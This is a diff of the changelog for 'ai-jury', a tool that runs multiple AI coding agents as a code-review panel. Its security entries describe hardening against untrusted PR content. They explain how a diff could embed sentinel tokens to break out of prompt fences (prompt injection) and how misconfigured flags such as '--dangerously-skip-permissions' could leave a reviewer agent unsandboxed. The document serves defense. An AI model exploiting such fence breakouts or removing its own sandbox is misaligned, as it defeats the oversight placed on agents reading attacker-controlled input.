@@ -690,7 +659,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > (the result cache invalidates once). Each change was cross-vendor jury-reviewed.
 
 ### Security
-
 - **Post-v1.3.0 security re-audit** (`docs/security-audit-2026-06-07-v1.3.0.md`). A four-surface re-audit of the released code confirms every #287–#296 fix holds in source (no Critical/High) and documents the remaining defense-in-depth gaps: the read-only sandbox guarantee is not yet unconditional for an **unknown vendor** (no sandbox injected, no privilege warning), the **untrusted-content sentinel fences aren't neutralized** against an embedded closing token, redaction still misses **basic-auth URLs / Azure / GCP** secret formats, and the `detect_capabilities` version probe doesn't kill its process group on timeout. Tracked as #300–#303.
 - **The privilege audit now flags any unsandboxed non-claude reviewer** (#300). `audit_agent` previously warned only when a *dangerous flag* was present, so an unknown-vendor (or no-flag) agent that ran via the generic adapter produced **zero** warnings — and `--strict` couldn't fail it on that basis. It now warns whenever a non-claude agent isn't under a recognized read-only sandbox (`-s read-only` / `--sandbox`), closing the audit blind spot; a `local`/HTTP agent (no subprocess to sandbox) is correctly out of scope. (`--strict` already rejected an unknown vendor via config validation; this makes the default-mode gap visible too.)
 - **Untrusted-content sentinel fences are neutralized before interpolation** (#301). The prompt templates wrap the diff/context/reviews in `<<<UNTRUSTED_X … UNTRUSTED_X>>>` fences; a diff that embedded a closing/opening sentinel verbatim could break out of (or forge) a fence. `prompts.neutralize_sentinels` now breaks any `<<<`/`>>>` run adjacent to an `UNTRUSTED_` marker in untrusted values (using a visible middle dot, not a zero-width char the injection scanner would flag) before every `format()`; the injection scanner still surfaces the attempt and the structured CI gate remains authoritative. `PROMPT_VERSION` bumped to 3 (cache invalidation).
@@ -706,15 +674,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > path), and the **read-only sandbox is always enforced** for reviewers.
 
 ### Changed
-
 - **README: the version badge now reads from PyPI** (#281). The `github/v/release` shields.io badge frequently rendered "Unable to select next GitHub token from pool" (a transient failure of shields.io's shared GitHub token pool); swapped for `pypi/v/ai-jury`, which uses a different, more reliable source and shows the actually-installable version.
 
 ### Added
-
 - **Docs: a live dogfood case study** (`docs/case-study-dogfood-v1.2.0.md`, in the docs portal). Logs the jury (codex + agy + qwen, no Claude) reviewing the five PRs that became v1.2.0: 5 real bugs caught before merge (incl. a crash and a check-disabling bypass) **and** 3 false positives the chair wrongly "verified" — with the honest lesson that a non-executing verifier confirms plausible-but-wrong findings, so a panel is a high-recall finder that still needs executed verification.
 
 ### Security
-
 - **A whole-codebase security audit** (`docs/security-audit-2026-06-07.md`) — static review across four attack surfaces (subprocess/sandbox, network/SSRF, prompt-injection/redaction, filesystem/parsing) with the High findings verified in source. Tracked as #288–#293.
 - **The read-only sandbox is now enforced at the adapter layer, not left to config** (#288). The mandatory restriction flags lived entirely in each agent's `extra_args`, so an empty or misconfigured `jury.toml` (`extra_args = []`, a dropped `--disallowed-tools`/`-s read-only`/`--sandbox`) produced a write/tool-capable reviewer of an attacker-controlled diff, and the privilege audit only *warned*. `build_argv` now passes `extra_args` through `privilege.enforce_read_only`, which **guarantees** claude's write tools are in `--disallowed-tools` (merging into any existing value), and injects the secure-default sandbox for codex (`-s read-only`) / agy (`--sandbox`) when none is configured. Config may still knowingly *widen* a codex sandbox (an audited opt-in), but can no longer *remove* the restriction. Local (network) and unknown vendors are left untouched.
 - **The privilege audit no longer trusts a bare `--sandbox` token blindly** (#292). `_is_sandboxed` is now vendor-aware: only the agy/gemini boolean `--sandbox` counts as a bare sandbox, while a codex sandbox must carry an explicit restricting value (`read-only`). A misleading `["--sandbox", "--dangerously-skip-permissions", "--yolo"]` on a non-agy vendor — previously judged "fully safe" — is now correctly surfaced.
@@ -728,13 +693,11 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.2.0] - 2026-06-05
 
 ### Fixed
-
 - **`gh` calls are now time-bounded** (#246). `_gh` and `_gh_with_input` ran `subprocess.run` without a `timeout=`, so a stalled network call or an interactive auth/2FA prompt could hang the whole jury run indefinitely. Both now pass a 90 s ceiling and convert `TimeoutExpired` into a clear, fail-soft `RuntimeError` (`gh … timed out after 90s`), consistent with other gh failures.
 - **`redaction_count` no longer inflated for a chunked review with expanded context** (#249). The same context is reviewed against every chunk, so redacting it inside each per-chunk `run_jury` counted its secrets once per chunk and `_merge_chunk_outcomes` summed them (a 1-secret context over 8 chunks reported 8). The context is now redacted **once** in `review_diff` before fan-out and its count added back a single time; per-chunk diff redactions are still counted per chunk (correct, each diff is distinct). Full (non-chunked) reviews are unaffected.
 - **Anti-bias: the verification prompt no longer exposes reviewer identities** (#250). `_format_findings_for_verify` emitted `(by {reviewer})`, so the chair could see which agent raised each candidate finding while judging it — a self-preference gap the debate (#37) and synthesis (#38) anonymization already closed, but the verify phase never did. Reviewer attribution is dropped from the verify input (verdicts match back by `file`/`line`/`claim`); the rendered report still attributes every finding by real agent name.
 
 ### Added
-
 - **PR descriptions are now enforced, not just templated** (#271). A GitHub PR template only pre-fills the body — it can't stop a PR being opened/merged empty (as #270 was). Added a `Related issues` (`Closes #N`) section to `.github/pull_request_template.md` and a `pr-lint` workflow (`.github/workflows/pr-lint.yml`) that fails a PR whose description has no real summary (< 20 chars of prose, excluding headings/checklists) or no issue reference (`#N`, or an explicit `no issue` opt-out). Pure stdlib Python, reads the body from the event payload via an env var (no shell injection). To make it blocking, add **PR description lint / PR has a real description + linked issue** to the branch-protection required checks (one-time repo setting).
 - **Friendly first-impression CLI surface** (#265). Running bare `jury` with no arguments **in a terminal** now prints a compact overview — one line on what it does plus the handful of commands most people use — and exits 0, instead of the argparse error. Non-interactive use (piped/CI) keeps the strict `provide one of --pr/--issue/--diff-file` error + non-zero exit. Adds two argv-intercept subcommands: `jury examples` (common example commands) and `jury guide` (a short end-to-end walkthrough).
 - **TL;DR verdict callout at the top of every report.** The report now opens with a one-line `> ⚡ **TL;DR · <verdict>**` callout so the outcome is the first thing a reader sees — above the panel and the full breakdown. The headline is the panel vote's verdict when voting, otherwise the chair's `## Verdict` line lifted verbatim from the synthesis (works for both PR review — APPROVE/COMMENT/REQUEST CHANGES — and issue triage — READY/NEEDS-INFO/UNCLEAR). Purely additive and deterministic: omitted when no verdict is available (failed/absent synthesis), never replacing a section. Report goldens regenerated.
@@ -742,7 +705,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.1.1] - 2026-06-05
 
 ### Fixed
-
 - **Credibility-cluster bugs the jury found reviewing its own repo**:
   - #245 — `--fail-on blocker` now fires: `blocker` is normalized to its documented `critical` alias instead of a gate that silently never triggers.
   - #247 — a verifier-**rejected** (`unsupported`) major finding no longer drives a `high` risk level.
@@ -753,7 +715,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - #254 — the release **SBOM** is built from an isolated wheel-only venv (the package + its declared, empty runtime deps), not `cyclonedx-py environment` over the whole runner (`pyproject` is not a valid `cyclonedx-py` subcommand, which would have failed the publish).
 
 ### Changed
-
 - **Benchmark: measured the panel's lift over each model, published honestly.** Added `benchmark/sweep.py` — runs each reviewer **solo** vs the **panel** vs the **full jury** over the labeled fixtures (`benchmark/`) — and `docs/benchmark-results.md`. Live v1.1.0 (2026-06-05, 4 vendors: claude/codex/agy + local `qwen2.5-coder:7b`; each cloud reviewer used its CLI's default model at run time, not pinned): run alone, **every** model missed seeded bugs (best 67%, worst 33%, all at 100% precision); the **panel caught 100%** — so **vendor diversity robustly lifts recall**, whichever single you'd have picked. The precision/verification effect is **within noise at N=5** (jury precision varied 1.00↔0.60 between runs) and is **not** claimed. Surfaced on the homepage "Why a panel" section + the README benchmark section; Magpie stays credited in the prior-art/comparison docs (not re-stated on the results page). No sitemap/robots change — docs pages are `docs.html` fragments, not separate URLs.
 - **Docs: dropped the stale "MVP" framing.** `feasibility.md` (research grounding) still called the now-shipped v1.1.0 project an "MVP" in the present tense ("this MVP", "MVP run observations", "running the MVP"). Reworded to "first version / v1 / ai-jury" and retitled the run notes "Live-run observations"; the historical research context is unchanged.
 - **Docs: broadened the ecosystem comparison & prior art.** Added two categories to `comparison.md` — *host-assistant plugins* (e.g. open-code-review: multi-persona debate inside one host/vendor) and *per-rule CI checks* (e.g. Continue: no cross-agent debate) — and noted Calimero (Anthropic-only consensus) under API-level. README prior-art now cites VulTrial (ICSE 2026), the academic prosecutor/defense/judge/jury approach. Framing verified against each project's own docs.
@@ -806,7 +767,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.1.0] - 2026-06-04
 
 ### Added
-
 - **Guided init wizard** (#231): `jury init --wizard` runs an opt-in,
   numbered-option setup for the most-used settings (reviewers, depth,
   chair-vs-vote decision, verification, context policy + secret redaction, CI
@@ -857,7 +817,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   and cache key are unchanged.
 
 ### Changed
-
 - **Example-rich parameter reference, surfaced on the site** (#209): `docs/parameters.md`
   now opens with a **Common recipes** block (copy-pasteable commands for the everyday
   jobs) and carries a worked **Example** for every flag group, with enum values and
@@ -892,7 +851,6 @@ debate, verify, and synthesize one verdict on a diff or PR — stdlib-only, secu
 by default, project-agnostic.
 
 ### Changed
-
 - **CI runs entirely on GitHub-hosted runners now that the repo is public.** The
   hosted `ci.yml` matrix (ubuntu/macOS/windows × Python 3.11–3.13) plus a
   coverage gate is the authoritative per-push/PR signal, and CodeQL + OpenSSF
@@ -902,24 +860,54 @@ by default, project-agnostic.
   minutes make it unnecessary. The website (GitHub Pages) and PyPI publishing
   (OIDC trusted publishing on `v*` tags) are now live.
 
-### Fixed
 
+- The `ai-jury` skill is now a compound, end-to-end flow: scaffold a config
+  if needed (`jury init`) → review → capture the report (`-o`) → summarize,
+  noting that `jury` already combines review + report in one command. Covers the
+  local/open-weight option and add-ons (`--incremental`, `--suggest-patches`,
+  `config show`, `--doctor`).
+- README and hero visual updated to cover current capabilities (#112): the hero now
+  shows the **fourth, local / open-weight** panelist (alongside Claude/Codex/Antigravity)
+  and the broader pipeline; the README leads with free/offline reviews, `jury init`,
+  and secure-by-default sandboxing, and the Status section reflects shipped features.
+- Run metadata schema bumped to v2: adds `stop_reason`, `skipped`, `retried`,
+  `budget_exhausted`, `from_cache`, an `execution` block, and per-agent
+  `attempts`.
+
+- Public CLI compatibility contract: `tests/test_cli_contract.py` locks the
+  CLI's flags, `--help` text (width/color-pinned golden under `tests/golden/`),
+  error messages, exit codes, and report headings, with a documented stability
+  policy in the README. **Breaking changes to these surfaces require a
+  CHANGELOG entry.**
+
+- Multi-version, multi-OS CI test matrix (Python 3.11–3.13 on Linux; 3.13 on
+  macOS and Windows) covering unit tests and the mock CLI smoke test.
+- OpenSSF Scorecard, CodeQL (Python), and Dependabot automation for supply-chain
+  and repository-security signals, plus a documented dependency-update policy.
+- Ecosystem comparison & capability matrix (`docs/comparison.md`) positioning the
+  project against hosted, API-level, and other native-CLI review tools.
+- Agent-readable docs: `llms.txt` (concise) and `llms-full.txt` (full reference).
+- Public release readiness checklist (`docs/release-checklist.md`).
+- Claude Code plugin distribution: `.claude-plugin/plugin.json` and
+  `.claude-plugin/marketplace.json` make the repo installable as a single-plugin
+  marketplace, reusing the existing `skill/` without moving it.
+- Platform support matrix (`docs/platforms.md`) with honest per-platform statuses
+  (supported / manual / planned / out of scope) and install snippets.
+- Reusable-skill packaging guide (`docs/skill.md`): directory layout, install into
+  Codex/Claude-compatible skill folders, required external tools, skill-to-CLI
+  versioning policy, examples, and a smoke-test checklist. Skill behavior changes are
+  noted in these release notes alongside the CLI change that motivates them.
+- Polished README hero visual (`docs/assets/hero.svg` + rendered `hero.png`) with
+  meaningful alt text and the project tagline.
+- Static landing site under `website/` (HTML/CSS, no build step) reusing the hero asset,
+  plus a GitHub Pages deploy workflow and local-preview/custom-domain instructions.
+
+### Fixed
 - Printing the report no longer crashes with `UnicodeEncodeError` on a Windows
   console (legacy cp1252 code page): the CLI now reconfigures stdout/stderr to
   UTF-8 at startup so the report's `🏛️`/`⇄` characters encode cleanly. Surfaced
   by the now-active hosted Windows CI job.
 
-### Security
-
-- Secure-by-default agent sandboxing (#100): the shipped reviewer defaults no
-  longer grant broad powers while reading untrusted PR content. `codex` now runs
-  `-s read-only` (was `danger-full-access`) — the diff is fetched by the jury,
-  not the agent, so the reviewer needs no write/network; `agy` now runs
-  `--sandbox`; `claude` keeps its write-tool denylist. The least-privilege audit
-  recognizes a sandbox as a mitigation, and the shipped defaults raise no
-  warnings. Widen a sandbox only if your workflow needs it.
-
-### Fixed
 
 - The result cache key now includes the repository review policy (#122); a
   `--policy` change no longer collides on the same key and serves a stale outcome.
@@ -960,8 +948,16 @@ by default, project-agnostic.
   reachability instead of a (non-existent) CLI on PATH, so a reachable local
   server no longer shows as `MISSING`.
 
-### Added
+### Security
+- Secure-by-default agent sandboxing (#100): the shipped reviewer defaults no
+  longer grant broad powers while reading untrusted PR content. `codex` now runs
+  `-s read-only` (was `danger-full-access`) — the diff is fetched by the jury,
+  not the agent, so the reviewer needs no write/network; `agy` now runs
+  `--sandbox`; `claude` keeps its write-tool denylist. The least-privilege audit
+  recognizes a sandbox as a mitigation, and the shipped defaults raise no
+  warnings. Widen a sandbox only if your workflow needs it.
 
+### Added
 - Published **test-coverage report + badge** on the project site (no external
   service): the Pages deploy runs the suite under coverage, publishes a
   browsable HTML report at `/coverage/`, and writes a shields-endpoint badge
@@ -1059,56 +1055,13 @@ by default, project-agnostic.
   routing, and how project-specific requests are handled; linked from
   CONTRIBUTING.
 
-### Changed
-
-- The `ai-jury` skill is now a compound, end-to-end flow: scaffold a config
-  if needed (`jury init`) → review → capture the report (`-o`) → summarize,
-  noting that `jury` already combines review + report in one command. Covers the
-  local/open-weight option and add-ons (`--incremental`, `--suggest-patches`,
-  `config show`, `--doctor`).
-- README and hero visual updated to cover current capabilities (#112): the hero now
-  shows the **fourth, local / open-weight** panelist (alongside Claude/Codex/Antigravity)
-  and the broader pipeline; the README leads with free/offline reviews, `jury init`,
-  and secure-by-default sandboxing, and the Status section reflects shipped features.
-- Run metadata schema bumped to v2: adds `stop_reason`, `skipped`, `retried`,
-  `budget_exhausted`, `from_cache`, an `execution` block, and per-agent
-  `attempts`.
-
-- Public CLI compatibility contract: `tests/test_cli_contract.py` locks the
-  CLI's flags, `--help` text (width/color-pinned golden under `tests/golden/`),
-  error messages, exit codes, and report headings, with a documented stability
-  policy in the README. **Breaking changes to these surfaces require a
-  CHANGELOG entry.**
-
-- Multi-version, multi-OS CI test matrix (Python 3.11–3.13 on Linux; 3.13 on
-  macOS and Windows) covering unit tests and the mock CLI smoke test.
-- OpenSSF Scorecard, CodeQL (Python), and Dependabot automation for supply-chain
-  and repository-security signals, plus a documented dependency-update policy.
-- Ecosystem comparison & capability matrix (`docs/comparison.md`) positioning the
-  project against hosted, API-level, and other native-CLI review tools.
-- Agent-readable docs: `llms.txt` (concise) and `llms-full.txt` (full reference).
-- Public release readiness checklist (`docs/release-checklist.md`).
-- Claude Code plugin distribution: `.claude-plugin/plugin.json` and
-  `.claude-plugin/marketplace.json` make the repo installable as a single-plugin
-  marketplace, reusing the existing `skill/` without moving it.
-- Platform support matrix (`docs/platforms.md`) with honest per-platform statuses
-  (supported / manual / planned / out of scope) and install snippets.
-- Reusable-skill packaging guide (`docs/skill.md`): directory layout, install into
-  Codex/Claude-compatible skill folders, required external tools, skill-to-CLI
-  versioning policy, examples, and a smoke-test checklist. Skill behavior changes are
-  noted in these release notes alongside the CLI change that motivates them.
-- Polished README hero visual (`docs/assets/hero.svg` + rendered `hero.png`) with
-  meaningful alt text and the project tagline.
-- Static landing site under `website/` (HTML/CSS, no build step) reusing the hero asset,
-  plus a GitHub Pages deploy workflow and local-preview/custom-domain instructions.
-
 ## [0.1.0] - 2026-05-30
 
 ### Added
-
 - Initial project-agnostic release of the cross-vendor review jury.
 - Native CLI adapters for Claude Code, Codex CLI, and Antigravity.
 - Review, debate, and synthesis orchestration pipeline.
 - Offline mock mode with unit tests and CLI smoke coverage.
 - GitHub PR diff input and optional PR comment output through the GitHub CLI.
 - Bundled Claude Code skill for invoking the jury from another project.
+
